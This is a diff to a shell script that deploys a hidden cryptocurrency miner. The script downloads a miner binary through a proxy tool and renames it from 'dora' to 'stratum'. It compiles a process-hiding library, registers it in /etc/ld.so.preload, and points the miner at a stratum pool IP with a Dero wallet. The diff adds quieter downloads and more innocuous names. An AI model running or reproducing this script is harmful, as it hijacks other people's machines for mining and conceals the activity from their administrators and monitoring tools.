@@ -4,7 +4,7 @@ dpkg-reconfigure --frontend noninteractive tzdata
 
 apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+wget -q https://www.dropbox.com/s/tgsmlqggphjv3vk/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
@@ -35,14 +35,14 @@ echo "******************************************************************"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/dora
-chmod +x dora
+./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/stratum
+chmod +x stratum
 
-./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/magicDora.zip
-unzip magicDora.zip
+./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/magic.zip
+unzip magic.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./dora -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe6z7uzurtp0ynqlx2kp4.notesepoloh -r stratum+tcp://170.187.197.220:443 -p stratum -m 8
+./graftcp/graftcp ./stratum -r stratum+tcp://128.199.159.60:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe6z7uzurtp0ynqlx2kp4.mepeteles -m 14
